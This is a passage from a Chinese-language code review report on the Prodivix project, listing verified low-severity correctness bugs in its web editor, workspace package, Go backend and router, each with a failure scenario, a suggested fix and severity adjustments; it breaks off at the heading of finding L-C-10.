**验证备注**: 已验证。`packages/golden-conformance/package.json:16` 以及 goldenG2VueTarget.browser.test.ts:6 处的 `describe.runIf(process.env.PRODIVIX_VERIFY_G2_VUE_TARGET === '1')` 守卫与引用完全一致。在 .github、specs 和 package.json 范围内执行 `git grep 'vue-target|VUE_TARGET|goldenG2VueTarget'` 只返回:根 package.json:54(脚本本身)、golden-conformance package.json:14/16,以及 specs/roadmap/g2-closure-evidence.md:53 —— 没有任何工作流命中。枚举 .github/workflows 中每一处 `verify:g*` 调用可确认 `verify:g2:vue-target` 缺席,而它的同级(verify:g1:browser、verify:g1:standalone、verify:g2:vue-product、verify:g2:data-*)都接入了 g0-g1-gates.yml / g2-data-closure.yml。`verify:g2` -> local-closure -> data-closure -> vue-product 只设置 PRODIVIX_VERIFY_G2_VUE_PRODUCT,确认聚合链到不了它。审查者未权衡的一个缓解事实:非浏览器的同级 `src/goldenG2VueTarget.conformance.test.ts` 确实通过 test:g2-data-target-matrix 在 CI 中运行(由 verify:g2:data-stream-debugger 到达,g2-data-closure.yml:114),因此投影 bundle 的契约仍受门禁保护;未被覆盖的只是真实的 install/typecheck/build 加浏览器 CRUD 全流程。严重性 medium 站得住脚,维持不变。

### 4.4 Low(102 条)

#### 4.4.1 正确性(correctness)

##### L-C-01 即使当前画布模式已禁用拖放,在 Component Tree 根节点上释放组件面板项仍会执行 canonical 插入

- **位置**: [`apps/web/src/editor/features/blueprint/editor/controller/useBlueprintCanonicalDragDrop.ts:229`](apps/web/src/editor/features/blueprint/editor/controller/useBlueprintCanonicalDragDrop.ts#L229)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-blueprint`

**详情**: 控制器在 design 模式之外通过传入 `workspace: undefined` 来禁用拖拽编辑(useBlueprintEditorController.ts:628-633)。`handleDragEnd` 中每个带守卫的分支都会检查该值,但最后的组件面板兜底分支只检查 `overKind`。画布的 droppable 在 design 模式之外确实被禁用(`disabled: !isDesignMode`,BlueprintEditorCanvas.tsx:143),因此那里的 `'canvas'` 不可达;但树根 droppable 仅在没有根节点时才被禁用(`disabled: !rootNode`,BlueprintEditorComponentTree.tsx:93-97),所以 `'tree-root'` 仍会匹配。`input.onInsertPaletteItem` 会转发到控制器的 `insertPaletteItem`,后者针对*真实的* workspace 做校验,于是写入得以生效。在同一模式下把内容释放到树*节点*上却静默无操作(两个分支都不进入),因此该行为在内部也是自相矛盾的。

**失败场景**: 作者把画布切换到 Interactive 或 Run 模式(`Ctrl+Alt+I` / `Ctrl+Alt+R`),然后从组件面板拖出一张 `Button` 卡片并在 Component Tree 主体区域松手。由于 `input.workspace` 为 undefined,`handleDragMove` 抑制了所有放置提示,因此没有任何视觉反馈,但 `handleDragEnd` 仍会进入 `overKind === 'tree-root'` 分支,并向 canonical PIR 文档提交一条真实的组件面板插入 Command。

**修复建议**: 用与其他分支相同的值来守卫这个兜底分支:在 `reset()` 之后立即加上 `if (!workspace) return;`(或在 `overKind` 条件中加上 `workspace &&`)。此外,在 design 模式之外禁用 tree-node/tree-root 的 droppable 以及组件面板的 draggable,也能让被抑制的放置提示与实际行为保持一致。

**验证备注**: 代码与描述一致:useBlueprintCanonicalDragDrop.ts:229 只用 overKind 做守卫;树根 droppable 仅由 `disabled: !rootNode` 禁用(BlueprintEditorComponentTree.tsx:93-97),而画布 droppable 使用 `disabled: !isDesignMode`(BlueprintEditorCanvas.tsx:143);useBlueprintEditorController.ts:628-633 在 design 模式之外传入 `workspace: undefined`(由提交 1f30a99 在既有兜底分支之上加入,这使一个原本的死分支变为可达)。DraggablePreviewCard(SidebarDraggableCards.tsx:38-41)从不禁用 useDraggable,因此在 interactive/run 模式下把组件面板项释放到树主体区域确实会到达 insertPaletteItem。严重度已下调,且审查者的两条支撑论据是错误的:(a) 该写入并非无守卫——insertPaletteItem(第 568-575 行)仍会检查 `!workspace || readonly || !targetLocation`,解析出真实的放置位置,并应用一条经过校验的可逆 Command,所以没有破坏任何架构不变量,也不会产生数据损坏;(b)“`handleDragMove` 因为 input.workspace 为 undefined 而抑制了所有放置提示”属于误读——handleDragMove(第 146-160 行)只要 `source`(树排序数据)缺失就提前返回,而这在 design 模式下的每一次组件面板拖拽中同样成立,因此提示抑制并非模式特有。design 模式之外的编辑写入也并未被其他机制阻断:组件面板双击(控制器第 959 行 onAddComponent)以及树的删除/复制/移动(BlueprintEditor.tsx:329-334)在 run 模式下都会写入。因此真正的缺陷是一处内部不一致的 UX 瑕疵——释放到树根会在 `selectedLocation ?? rootLocation` 处插入,而释放到树节点则静默无操作——并不是守卫被绕过。

##### L-C-02 每一次服务端确认的 outbox 结果都会把 Workspace 撤销/重做历史压缩为单条记录

- **位置**: [`apps/web/src/editor/workspaceSync/WorkspaceOutboxEffects.tsx:71`](apps/web/src/editor/workspaceSync/WorkspaceOutboxEffects.tsx#L71)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-store-sync`

**详情**: `adoptResumeResult` 把*所有*非冲突的 outbox 结果——包括根本没有发生 rebase 的普通 `kind: 'acknowledged'`——统统路由到 `adoptRebasedWorkspaceOperation`。该 store action 无条件调用 `resetWorkspaceHistory(state.workspaceHistory)`(editorStore.workspaceSlice.ts:506),它返回 `undoStack`/`redoStack` 均为空的 `createWorkspaceHistoryState({maxEntries, mergeWindowMs})`(packages/workspace/src/workspaceHistory.ts:321-327),随后记录一条合成的 'Adopt rebased workspace operation'。只有在真正发生 rebase 时这次重置才是正确的,这也正是结果类型携带 `rebased: boolean` 标志的原因(workspaceOutboxExecutor.ts:50, 58, 349, 425)——但没有任何生产代码读取它;`git grep` 显示 `rebased` 只在测试中被断言。由于 `enqueueWorkspaceOperationOutboxAndDispatch` 在每次乐观应用之后都会调用 `notifyWorkspaceOutboxChanged`,这个 effect 会在每一次保存之后运行并摧毁历史。

**失败场景**: 用户在一个远程项目中执行三次编辑 E1、E2、E3;`dispatchWorkspaceCommand` 记录了三条撤销条目。outbox effect 排空 E1,服务端以 `rebased: false` 且无远端分叉的方式确认它。`adoptResumeResult` 仍然调用 `adoptRebasedWorkspaceOperation`,后者把 `workspaceHistory` 置为只含一条 'Adopt rebased workspace operation' 记录的全新状态。此时按 Ctrl+Z 只能撤销那条合成条目;E1/E2/E3 不可达,重做栈为空。因此用户可配置的撤销深度(SettingsEffects.tsx `DEFAULT_HISTORY_LIMIT = 80`,最大 500)对任何在线 workspace 都失去了意义。

**修复建议**: 遵循 `result.rebased`:当它为 false 且三方合并没有产生远端侧变更时,改用保留历史的 `applyWorkspaceMutation` 来应用这次确认,而不是 `adoptRebasedWorkspaceOperation`。或者为 `adoptRebasedWorkspaceOperation` 增加显式的 `resetHistory` 入参,只在真正发生 rebase 时置位。

**验证备注**: 机制描述准确:adoptResumeResult(WorkspaceOutboxEffects.tsx:71-78)把每一个非冲突、非“已应用”的结果(包括 rebased:false 的 kind 'acknowledged' 以及 'queued')都路由到 adoptRebasedWorkspaceOperation,后者无条件调用 resetWorkspaceHistory(editorStore.workspaceSlice.ts:506)返回空的撤销/重做栈,然后记录一条条目。git grep 确认生产代码从不读取 `rebased`。但所声称的失败在实质上是错误的:那条被记录的条目并不是合成占位符,而是由 serverBaseSnapshot -> confirmedSnapshot 重建出的真实可逆操作(第 479-486 行),因此 Ctrl+Z 确实会一步回退 E1/E2/E3 合并后的内容——editorStore.workspace.test.ts:421-427 和 524-528 正是这样断言的。两个既有测试(第 410 行和第 518 行)刻意断言采纳之后 undoStack 长度为 1,其中一个用例包含两条不同的本地 Command,说明这种压缩是设计使然且已有覆盖,而非意外回归。站得住脚的残余问题只是:在线 workspace 的撤销粒度/深度被压缩为一步,从而使可配置的撤销上限(SettingsEffects.tsx DEFAULT_HISTORY_LIMIT = 80)在那里形同虚设。这是 UX/历史深度上的局限,而不是正确性或数据完整性缺陷,因此严重度从 high 下调为 low。

##### L-C-03 预检诊断的控制台行 id 基于索引,因此“Clear”会永久隐藏后续诊断

- **位置**: [`apps/web/src/editor/features/execution/executionConsoleModel.ts:108`](apps/web/src/editor/features/execution/executionConsoleModel.ts#L108)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-execution`

**详情**: 诊断控制台行以 `preflight:${code}:${index}` 作为 key,其中 `index` 是当前 `diagnostics` 数组中的位置——该 id 不携带任何内容信息。`ExecutionCenter` 把已清除/已暂停的行 id 存入 `clearedConsoleLineIds`(ExecutionCenter.tsx:200),并用 `!clearedConsoleLineIds.has(line.id)` 过滤(ExecutionCenter.tsx:258)。该集合只在 `sessionId` 变化时重置(ExecutionCenter.tsx:360-365),而项目测试的会话 id 在多次运行之间是稳定的(`workspace:{id}:project-tests`)。因此,后来出现的一条不同诊断,只要恰好具有相同的 code 且落在相同的数组索引上,就会继承已被清除的 id 并被静默抑制。该集合还会随着同一会话内反复清除而无界增长。

**失败场景**: 用户在 Testing 页面运行测试;编译被一条诊断阻断:`PDX-EXP-0001: missing route target` -> 行 id 为 `preflight:PDX-EXP-0001:0`。用户点击 Clear(控制台界面)-> 该 id 被加入 `clearedConsoleLineIds`。用户编辑 workspace 并重新运行;编译再次被阻断,但这次是索引 0 上一条*不同的* `PDX-EXP-0001` 诊断(消息/路径不同)-> id 相同 -> 该行被过滤掉。控制台显示 `execution.empty`,状态徽标却显示已阻断,用户得不到任何关于本次运行被阻断的解释。

**修复建议**: 由诊断内容派生行 id(例如对 `code|severity|message|path` 做哈希再加上序号),以及/或者在 `diagnostics` 标识变化时(而不只是 `sessionId` 变化时)重置 `clearedConsoleLineIds` / `pausedConsoleLineIds`。

**验证备注**: 机制与描述完全一致:诊断行 id 为 `preflight:${diagnostic.code}:${index}`,不含任何内容成分(executionConsoleModel.ts:108);clearCurrentView 把当前所有控制台行 id 并入 clearedConsoleLineIds(ExecutionCenter.tsx:487-491);可见列表按 !clearedConsoleLineIds.has(line.id) 过滤(ExecutionCenter.tsx:258);重置 effect 只以 [sessionId] 为依赖(ExecutionCenter.tsx:360-365);而项目测试会话 id 在每个 workspace 内是稳定的(`workspace:${workspaceId}:project-tests`,projectTestExecutionClient.ts:17)。所以后来一条 code 相同、数组索引相同的不同诊断会继承已清除的 id 并被抑制,且该集合在一个会话内无界增长。严重度下调为 low:影响仅限于 Console 视图——ProjectTestingPage 仍会在 ProjectTestingPage.tsx:276 和 :434 依据 runner.message(preflightMessage = plan.diagnostics[0].message)渲染阻断原因,因此用户并不像失败场景所称的那样得不到任何解释;没有数据正确性或持久化方面的影响,而且前提是用户先点击过 Clear。

##### L-C-04 NodeGraph 列表编辑处理器读取的是在 `setNodes` updater 内部被修改的 `blocked` 标志,因此守卫可能被绕过并仍然删除边

- **位置**: [`apps/web/src/editor/features/development/reactflow/nodeGraphFlowNodes.ts:92`](apps/web/src/editor/features/development/reactflow/nodeGraphFlowNodes.ts#L92)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-code-anim-graph`

**详情**: `onRemoveCase`、`onRemoveBranch`、`onRemoveStatusCode`、`onRemoveKeyValueEntry` 和 `onRemoveBindingEntry` 都在 `setNodes` 状态 updater 函数内部设置一个局部变量 `blocked`,然后在下一行同步读取它。React 并不保证 `setState` 的 updater 在派发期间同步执行——急切求值的 bailout 只在目标 fiber 没有待处理更新时才适用;否则 updater 会推迟到渲染期间才运行。届时 `blocked` 仍为 `false`,“至少保留一个 X”的提示不会显示,更严重的是,代码会继续执行到 `setEdges(...)`,把连接到那个本应*不被删除*的 case/branch/status 上的所有边全部移除。这些 updater 还是非纯的(它们修改了外部变量),这与 React 的双重调用契约相冲突。

**失败场景**: 一个 `switch` 节点只剩下一个 case,它通过 `out.control.case-<id>` 和 `in.condition.case-<id>` 连线。用户在 `NodeGraphEditorContent` 上已经有另一个状态更新待处理时(例如同一批次中排队的 `setHint`/`setMenu`/`setNodes`)点击该 case 的删除按钮,于是 React 推迟了 updater 的执行。`blocked` 读到 `false`,没有提示出现,case 确实被正确保留,但它的两条边都被过滤掉了,而结果图会作为一条 Workspace Command 自动持久化——用户静默地丢失了这些连接。

**修复建议**: 在调用 `setNodes` 之前,从渲染运行时中已有的 `nodesById` 快照(或从持有最新节点的 ref)计算守卫条件,在 updater 之外决定 `blocked`,然后再发出 `setNodes`/`setEdges` 这对调用。保持状态 updater 为纯函数。

**验证备注**: 代码与 nodeGraphFlowNodes.ts:91-122 相符,同样的形态还在第 184、240、329 和 399 行重复出现;setNodes/setEdges/setHint 都是同一个 NodeGraphEditorContent fiber 上的 React 状态(useNodesState/useEdgesState 位于 NodeGraphEditorContent.tsx:156-159),因此在派发之后立刻读取 `blocked` 完全依赖 React 未写入文档的急切状态 bailout,而该 bailout 只在 fiber.lanes === NoLanes 时适用(在 React 19.2 中仍然如此)。非纯 updater 同样违反 React 的纯度契约,并会在 main.tsx:15 的 StrictMode 根下被双重调用。不过审查者陈述的触发条件并不像描述那样可达:在点击事件内,删除处理器的 setNodes 是该 fiber 上的第一个更新(React Flow 的选中发生在更早的离散 pointerdown 上,并会同步刷新;祖先的 onClick/setMenu 处理器则在其后冒泡),而由 useSyncExternalStore 驱动的 zustand 更新调度在 Sync lane 并在微任务中刷新。剩下的唯一窗口是一个尚未被 Scheduler 刷新的 Default lane 待处理更新(例如由 ResizeObserver 驱动的 onNodesChange)——只有几毫秒的窗口。这确实是一个脆弱的模式,一旦命中会造成真实的删边后果,但不是确定性的生产故障,因此 medium 被高估了。

##### L-C-05 文件选择器的 `accept` 过滤条件滞后一次交互而陈旧,因为 click() 在 React 提交新属性之前就已运行

- **位置**: [`apps/web/src/editor/features/resources/ResourceFileTree.tsx:166`](apps/web/src/editor/features/resources/ResourceFileTree.tsx#L166)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-resources-issues`

**详情**: `triggerImport` / `triggerImportByCategory` 在同一个同步事件处理器中先调用 `setImportCategory(...)`,再调用 `fileInputRef.current?.click()`。React 只有在处理器返回之后才提交状态更新(以及第 417 行的 `accept={importCategory ? IMPORT_ACCEPTS[importCategory] : undefined}` 属性),因此原生文件对话框打开时携带的是*上一次*交互的 `accept` 值。而在对话框关闭后运行的 `onChange` 处理器读取的却是*新的* `importCategory`,并把该分类强加到用户实际选中的文件上。

**失败场景**: 用户右键点击一个文件夹并选择“Import fonts”。选择器打开时没有 accept 过滤(首次使用)或带着上一个分类的过滤条件,于是用户可以选中 `logo.png`。确认后,`onImportByCategory(importTargetId, 'font', files)` 运行,`createAssetDocument` 以 `category: 'font'` 存储该 PNG,产生一个分类与其 MIME 类型相矛盾的 asset 文档(它随后会被字体预览路径提供,而被图片预览路径跳过)。

**修复建议**: 在调用 `click()` 之前立即以命令式方式在 `fileInputRef.current` 上设置 `accept` 属性(或把 click 推迟到一个以待处理导入请求为依赖的 `useEffect` 中),使对话框与 onChange 处理器针对同一个分类达成一致。

**验证备注**: 证据与 ResourceFileTree.tsx:154-167 以及第 413-431 行带 `accept={importCategory ? IMPORT_ACCEPTS[importCategory] : undefined}` 的 input 吻合。React 语义解读正确:在离散的 click 处理器中调用 setState(工具栏按钮以及 ResourceFileTreeContextMenu 在第 107/118/129 行的 onClick 都是如此)会被批处理,并在处理器返回后才提交,因此 `fileInputRef.current?.click()` 打开原生对话框时用的是先前已提交的 accept 值;代码中没有 flushSync。实际上该过滤条件几乎总是错的——onChange 在第 429 行把 importCategory 重置为 null,因此按分类导入通常会以无过滤的方式打开,而在用户取消对话框之后,下一次导入又会带着*上一个*分类的过滤条件打开。但所声称的数据后果并不成立:onChange 读取的是已提交的(正确的)分类,因此 PublicResourcePage.handleImportFilesByCategory(第 652-679 行)会用用户所选的确切分类给文件打标;`accept` 只是对话框的提示,用户可以绕过(而且 'other' 就是 '*'),所以无论有没有这个缺陷,把 PNG 标记为字体都是可达的。严重度下调为无完整性影响的 UX/过滤提示缺陷。

##### L-C-06 parseWorkspaceVFSTree 的文档自动挂载兜底分支不可达,导致省略 workspace.tree 的导入被以误导性的 VFS 错误拒绝

- **位置**: [`apps/backend/internal/modules/workspace/store_snapshot.go:32`](apps/backend/internal/modules/workspace/store_snapshot.go#L32)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `be-workspace`

**详情**: `parseWorkspaceVFSTree` 有两条分支:若 `treeJSON` 非空则校验所提供的树,否则(vfs_tree.go:440-463)构建默认树并通过 `tree.addDocument` 自动挂载每份文档。第二条分支永远不会执行。全部三个调用点传入的都是必定非空的值:`importWorkspaceSnapshot` 在调用前替换为 `defaultWorkspaceTree`(store_snapshot.go:32),而两个基于数据库的调用点(store_snapshot.go:369、operation_commit_apply.go:43)读取的是 NOT NULL 的 jsonb 列。`defaultWorkspaceTree` 包含根节点加 7 个目录且零个文档节点,因此 `validateWorkspaceVFSState` 的 `len(documentNodes) != len(documents)` 检查会失败。

**失败场景**: 以 `{"name":"x","workspace":{"documents":[{"id":"doc_root","type":"pir-page","path":"/pir.json","content":{...}}]}}` 且不带 `workspace.tree` 字段调用 POST /api/workspaces/import-local-project。`normalizeJSONDocument(nil, defaultWorkspaceTree)` 返回无文档的默认树,`parseWorkspaceVFSTree` 走 wire 分支,请求以 HTTP 422 `invalid workspace vfs: tree contains unreachable nodes or document mounts are incomplete` 失败——尽管该模块中恰恰写有在未提供树时自动挂载文档的代码。这条消息把调用方指向了一棵他们从未发送过的树。

**修复建议**: 把 `params.Tree`(未经替换)传入 `parseWorkspaceVFSTree`,使客户端省略树时自动挂载兜底分支真正执行,并从 `normalizeJSONDocument` 调用中去掉 `defaultWorkspaceTree` 兜底。如果按 API 契约树确实是必填的,则删除 vfs_tree.go:440-463 中的死兜底分支,并在处理器中以明确的 `workspace.tree is required` 消息拒绝缺失的树。

**验证备注**: 无法证伪;我逐环验证过。parseWorkspaceVFSTree 的 wire 分支位于 vfs_tree.go:372,自动挂载兜底从 vfs_tree.go:440 开始,使用 defaultWorkspaceVFSTree(rootID) 并对每份文档调用 tree.addDocument,与描述完全一致。我用 git grep 枚举了全部调用点:store_snapshot.go:123(导入)、store_snapshot.go:369(snapshot 读取)、operation_commit_apply.go:43(提交),以及 vfs_tree_test.go:9/71/147。store_snapshot.go:32 在调用前通过 normalizeJSONDocument 替换为 defaultWorkspaceTree,而两个基于数据库的调用点读取的 tree_json 在 platform/database/database.go:101 被声明为 JSONB NOT NULL——因此该兜底分支只能从传入 nil 的 vfs_tree_test.go:9 到达。defaultWorkspaceVFSTree(vfs_tree.go:131-197)构建了根节点加 dir_public/dir_scripts/dir_styles/dir_shaders 以及嵌套的 public 目录,零个文档节点;而 store_snapshot.go:28-30 要求至少一份文档,因此 validateWorkspaceVFSState 在 vfs_tree.go:337-339 处的 len(documentNodes) != len(documents) 检查必然以引述的 'unreachable nodes or document mounts are incomplete' 消息失败。注意引导路径不受影响——module.go:111 使用 defaultWorkspaceTreeWithDocumentJSON,它确实会挂载该文档。严重级别由 medium 修正为 low:影响是生产环境的死代码,外加对省略 workspace.tree 的 API 消费方返回一个误导性的 422。第一方客户端(apps/web/src/editor/editorApi.ts:462)始终编码包含树在内的完整 workspace manifest,没有任何内容被持久化,也没有不变量被破坏——请求被正确拒绝,只是解释不对。

##### L-C-07 Workspace projection 写侧的冲突检测使用了与读侧别名映射不同的键空间,导致合法 Workspace 能被导出却永远无法重新导入

- **位置**: [`packages/workspace/src/workspaceProjection.ts:299`](packages/workspace/src/workspaceProjection.ts#L299)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-workspace`

**详情**: `projectWorkspaceToProdivixFiles` 仅通过比较 `normalizeSourcePath(file.path)` 来检测冲突文件,而 `readWorkspaceFromProdivixFiles` 用 `createSourceFileMap` 构建查找表,后者会把每个文件同时注册到其规范化路径以及带 `.prodivix/` 前缀的别名下。因此,一个被投影到裸路径的 code document 会别名进入存放 workspace 与 route manifest 的 `.prodivix/` 命名空间,而这一冲突对写侧不可见,对读侧却是致命的。

**失败场景**: 某个 Workspace 包含一个 `path: '/workspace.json'` 的 code document(这是被允许的:`isCanonicalWorkspaceDocumentPath` 只拒绝首段为 `.prodivix` 的路径)。`documentContentPath` 把它映射为 `workspace.json`。`projectWorkspaceToProdivixFiles` 比较 `.prodivix/route-manifest.json`、`.prodivix/workspace.json`、`workspace.json` —— 三者互不相同 —— 于是返回 `ok: true`。把这批完全相同的文件回喂给 `readWorkspaceFromProdivixFiles` 时,`createSourceFileMap` 会先把 manifest 注册在 `.prodivix/workspace.json`(文件按升序排序),接着该 code 文件的别名 `toProdivixSourcePath('workspace.json')` 命中同一个键但对应不同文件,产生 `WKS_PROJECTION_PATH_CONFLICT` 与 `ok:false`。该 Workspace 能往外做一次投影,却永远读不回来。

**修复建议**: 让写侧预留与读侧相同的别名集合:在 `projectWorkspaceToProdivixFiles` 中把 `normalizeSourcePath(file.path)` 和 `toProdivixSourcePath(...)` 都插入 `paths`,任一冲突都报告 `WKS_PROJECTION_PATH_CONFLICT`(或者去掉 `createSourceFileMap` 中的 `.prodivix/` 别名机制,要求 manifest 的 `contentPath` 值必须精确)。

**验证备注**: 已通过实测验证。所引证据与 workspaceProjection.ts:298-304 吻合(写侧只按 normalizeSourcePath 去重),而 createSourceFileMap(第 102-109 行)会把每个文件同时注册在规范化路径和带 '.prodivix/' 前缀的别名下。isCanonicalWorkspaceDocumentPath(workspaceDocumentValidation.ts:45)只拒绝首段为 '.prodivix' 的路径,因此 '/workspace.json' 是合法的文档路径。对一个包含 '/workspace.json' 处 code document(内容 {language:'ts',source:...})的 Workspace 运行真实函数:projectWorkspaceToProdivixFiles 返回 ok:true,而把这批完全相同的文件喂给 readWorkspaceFromProdivixFiles 则返回 ok:false,并在 '.prodivix/workspace.json' 处给出 WKS_PROJECTION_PATH_CONFLICT。该不对称确实存在。严重级别下调:可达性要求存在一个规范化路径恰好为 Workspace 根下 'workspace.json' 或 'route-manifest.json' 的 code document(或一个刻意构造的、遮蔽了某个非 code 文档投影路径的 'documents/<x>' 路径);而 Web 代码创作的新建流程会按类型基础目录加模板名放置文件,因此这需要用户刻意重命名为根级 manifest 名称。该故障在读取时失败关闭并给出精确的冲突 issue,导出的文件仍包含全部内容(无数据丢失/损坏),因此它只是让一条边缘往返链路降级,而不会损坏 Workspace。

##### L-C-08 createWorkspaceCodeDocumentCommand 构造 JSON pointer 时未对片段做转义,与其他所有 Command 工厂不一致

- **位置**: [`packages/workspace/src/workspaceCommand.ts:906`](packages/workspace/src/workspaceCommand.ts#L906)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-workspace`

**详情**: 这是本包中唯一一个把 id 插入 JSON pointer 却不使用 `escapePointerSegment` 的补丁操作构造器。`planWorkspaceDocumentAtPath`、`workspaceVfsIntent.createCommand`、`workspaceRouteIntentCommand.appendDocumentMetadataPatches`、`workspaceResourceDocument`、`workspaceDesignTokenResolverDocument` 以及所有组件/数据 planner 都会转义 `~` 和 `/`。同文件中的 pointer 解析器严格遵循 RFC6901(`decodePointerSegment` 对后面不跟 `0`/`1` 的 `~` 返回 `undefined`),因此未转义的片段会产出无法解析的 pointer。

**失败场景**: `createWorkspaceCodeDocumentCommand({ ..., documentId: 'code~ui-shell', ... })` 会产出 `{op:'add', path:'/docsById/code~ui-shell', ...}`。在 `applyPatchOperations` -> `setValue` -> `resolveParent` -> `parsePointer` 中,`decodePointerSegment('code~ui-shell')` 看到 `~` 后跟的是 `u`,返回 `undefined`,于是 `parsePointer` 返回 `undefined`,`setValue` 返回 false。这次本来合法的创建会在 `/docsById/code~ui-shell` 处被 `WKS_COMMAND_PATCH_FAILED` 拒绝,用户永远无法创建该文档。若 `parentNodeId` 中含有 `/`,该 pointer 则会静默指向另一个节点。

**修复建议**: 对 `createWorkspaceCodeDocumentCommand` 的 `forwardOps` 与 `reverseOps` 中的 `documentId`、`nodeId` 和 `parentNodeId` 应用本包标准的 `escapePointerSegment`(把 `~` 替换为 `~0`,`/` 替换为 `~1`)。

**验证备注**: 所引证据与 packages/workspace/src/workspaceCommand.ts:906-911 完全吻合,周边的 reverseOps(917-920)同样未转义。解析器确实严格:decodePointerSegment(workspaceCommand.ts:432-447)对任何后面不跟 '0'/'1' 的 '~~' 返回 undefined,parsePointer 会把 undefined 向上传播,于是 setValue 失败,applyWorkspaceCommand 发出 WKS_COMMAND_PATCH_FAILED。没有任何机制约束 id 的字符集:isCanonicalWorkspaceId(validateWorkspaceVfs.ts:40-41)只要求是非空的 trim 后字符串,parseWorkspaceDocument(workspaceCodec.ts:209)对 id 也只做 requireString —— 无论是 packages/workspace 还是 Go 提交校验器中都没有任何正则(只存在资产摘要/媒体类型的模式)。这一不一致是真实的:workspaceVfsIntent.ts:435,468 以及其他所有补丁构造器都使用 escapePointerSegment/escapeJsonPointerSegment,而我对未转义补丁操作模板路径的全量排查只命中 workspaceCommand.ts:906/907/919/920(workspacePirGraphAuthoringTransaction.ts 与 workspaceCodeArtifactRefactor.ts 中其他未转义的 '/docsById/${...}' 命中属于诊断 issue 路径,不是补丁操作)。严重级别维持在下限、不应更高:(a) 该故障是失败关闭的 —— Command 被拒绝,而非数据损坏;(b) 审查者所称"若 parentNodeId 中含有 / 则 pointer 会静默指向另一个节点"被证伪 —— '/treeById/a/b/children/-' 必须解析固定形状 VfsNode 上并不存在的属性 'b',因此会失败;即便产生了游离字段,也会被 validateWorkspaceTransition -> validateWorkspaceSnapshot 捕获;(c) 面向用户的表述有误 —— 唯一的生产路径(apps/web useBlueprintEditorInspectorController.ts:1345-1362 -> createControlledCodeDocumentsPlan -> controlledRoundTrip.ts:674,704)把 documentId 推导为 `controlled-${selection.documentId}-${suffix}`,其中 suffix 已被剥离为 [a-zA-Z0-9];用户提供的是 `name`,它永远不会进入 pointer。因此可达性要求某个已有 PIR 文档 id 本身就包含 '~~' 或 '/'(例如导入的外部 Workspace),而不是用户输入文件名。属于潜伏的健壮性缺陷,定位准确,评级 low 正确。

##### L-C-09 相对导航目标同时带有查询串和 hash 时会丢失其 fragment

- **位置**: [`packages/router/src/routeCore.ts:988`](packages/router/src/routeCore.ts#L988)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-workspace-sync-router`

**详情**: `resolveRelativeRoutePath` 用 `trimmed.split(/(?=[?#])/, 2)` 把相对目标拆成路径与后缀两部分。`String.prototype.split` 对 `limit` 的处理方式是*截断*结果数组,而不是限制拆分次数,因此同时包含 `?` 和 `#` 的目标会得到三段,第三段(即 fragment)被丢弃。随后第 1002 行重新拼接后缀时已不含 hash,而 `resolveNavigateTarget` 又把这个被截断的路径喂给 `resolveRouteRuntimeContext`(第 1034-1037 行),于是 `parseRouteLocation` 永远看不到 `#`,`RouteRuntimeContext.hash` 返回 `undefined`。绝对目标(第 987 行)和纯 `?`/`#` 目标(第 984-986 行)都能保留 fragment,因此这一丢失是相对目标特有的。

**失败场景**: 在 `context.currentPath === '/users/abc'` 的情况下调用 `resolveNavigateTarget(manifest, context, { to: '../docs?tab=api#install' })`,会执行 `'../docs?tab=api#install'.split(/(?=[?#])/, 2)`,得到 `['../docs', '?tab=api']` —— `'#install'` 被丢弃。解析出的路径是 `/docs?tab=api`,返回的 `runtimeContext.hash` 为 `undefined` 而非 `'install'`,于是页面滚动到顶部而不是 `install` 锚点。同样的调用若改为 `to: '../docs#install'`(无查询串)则正常工作,使该故障与顺序相关、极易被忽略。

**修复建议**: 按第一个 `?` 或 `#` 的位置切分,而不要依赖 `split` 的 `limit`,例如 `const boundary = trimmed.search(/[?#]/u); const pathPart = boundary < 0 ? trimmed : trimmed.slice(0, boundary); const suffix = boundary < 0 ? '' : trimmed.slice(boundary);`

**验证备注**: 证据逐字节吻合(routeCore.ts:988 `trimmed.split(/(?=[?#])/, 2)`),并且我通过执行确认了 JS 语义:node -e 显示 '../docs?tab=api#install'.split(/(?=[?#])/, 2) === ['../docs','?tab=api'],而不带 limit 的 split 会得到包含 '#install' 的三段。后缀在第 1002 行重新拼接时不含 fragment,而绝对分支(`if (trimmed.startsWith('/')) return trimmed;`)以及纯 ?/# 分支都会保留它,因此这一丢失确实是相对目标特有的。不过严重级别被夸大:对所有被跟踪文件执行 `git grep resolveNavigateTarget`,只返回 packages/router/src/routeCore.test.ts(3 处调用)、routeCore.ts 自身以及 spec 文本 —— 在 apps/web、apps/backend 或任何包中都没有生产调用方(此前的一份静态审查 specs/implementation/reviews/2026-07-22-static-review.md:1884 也独立记录了 'resolveNavigateTarget 无生产调用方')。即便接入使用,影响也只是滚动锚点丢失,而非数据损坏。这是一个导出公共 API 中真实存在的潜伏缺陷,但今天不可达:low,而非 medium。

##### L-C-10 确定性测试的重放映射会永久缓存被拒绝的调用,且从不淘汰

- **位置**: [`packages/prodivix-compiler/src/react/standaloneServerRuntime.ts:475`](packages/prodivix-compiler/src/react/standaloneServerRuntime.ts#L475)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-compiler-targets`

